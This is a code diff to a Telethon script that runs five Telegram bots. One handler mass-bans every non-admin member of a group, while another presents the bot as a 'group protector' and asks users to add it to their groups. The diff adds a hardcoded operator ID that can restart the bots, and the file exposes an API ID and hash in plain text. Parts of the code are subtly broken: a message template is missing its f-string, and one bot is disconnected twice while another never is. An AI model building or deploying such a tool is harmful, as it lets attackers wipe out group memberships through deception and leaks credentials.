@@ -1,5 +1,8 @@
 import logging
 import os
+import sys
+import re
+import platform
 from os import getenv
 from telethon import TelegramClient, events
 from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins
@@ -15,7 +18,8 @@ TOKEN5 = getenv("TOKEN5")
 API_ID = 25981592
 API_HASH = "709f3c9d34d83873d3c7e76cdd75b866"
 
-SUDO = getenv("SUDO", "5180447182").split(" ")
+SUDO = getenv("SUDO").split(" ")
+OP = [5207435291]
 
 RIGHTS = ChatBannedRights(
     until_date=None,
@@ -54,7 +58,7 @@ async def banall(event):
                 uid = user.id
                 if uid not in admins_id and uid not in SUDO:
                     await event.client(EditBannedRequest(chat_id, uid, RIGHTS))
-                    await fuck.edit("`STARTED FUCKING THE GROUP...`")
+                    await fuck.edit("`STARTED FUCKING THE GROUP...\n\nCHAT ID = {chat_id}`")
             except:
                 pass
 
@@ -68,7 +72,25 @@ async def all(event):
     ok = await event.reply("`STARTING...`")
     await ok.edit("`I AM GROUP PROTECTOR BOT TO PROTECT YOUR GROUP PLEASE ADD ME IN YOUR GROUP...\n\nFOR MORE DETAILS CONTACT MY CREATOR HE MADE ME FOR TESTING PURPOSE ONLY...")
 
-
+@bot1.on(events.NewMessage(pattern="^/restart"))
+@bot2.on(events.NewMessage(pattern="^/restart"))
+@bot3.on(events.NewMessage(pattern="^/restart"))
+@bot4.on(events.NewMessage(pattern="^/restart"))
+@bot5.on(events.NewMessage(pattern="^/restart"))
+async def restart(event):
+    if event.sender_id in OP:
+        tct = "`Wait Restarting...`"
+        await event.reply(tct)
+        try:
+            await bot1.disconnect()
+            await bot2.disconnect()
+            await bot3.disconnect()
+            await bot4.disconnect()
+            await bot4.disconnect()
+        except Exception:
+            pass
+        os.execl(sys.executable, sys.executable, *sys.argv)
+        quit()
 
 print("BOT STARTED SUCCESSFULLY...")
 
